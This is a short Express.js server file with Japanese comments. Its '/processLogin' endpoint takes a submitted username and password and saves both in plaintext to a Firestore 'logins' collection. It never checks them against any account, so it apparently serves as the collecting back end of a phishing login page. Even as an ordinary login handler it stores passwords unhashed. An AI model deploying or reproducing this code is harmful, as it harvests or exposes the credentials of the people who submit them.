// app.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const admin = require('firebase-admin');  // firebase-admin を読み込む

// Firebaseの秘密鍵（firebase-service-account.json）を読み込む
const serviceAccount = require('./firebase-service-account.json');

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

// Firestoreのインスタンスを作成
const db = admin.firestore();

const app = express();

// ミドルウェア：POSTデータのパース
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 静的ファイルの配信（publicフォルダ内）
app.use(express.static('public'));

// フォーム送信のエンドポイント
app.post('/processLogin', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ status: 'Error', message: '入力が不足しています' });
  }
  
  try {
    // Firestore の "logins" コレクションにデータを追加する
    const docRef = await db.collection('logins').add({
      username: username,
      password: password,
      date: admin.firestore.FieldValue.serverTimestamp()
    });
    
    res.json({ status: 'Success', id: docRef.id });
  } catch (err) {
    console.error('Error writing to Firestore:', err);
    res.status(500).json({ status: 'Error', message: 'データ保存に失敗しました' });
  }
});

// サーバー起動
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});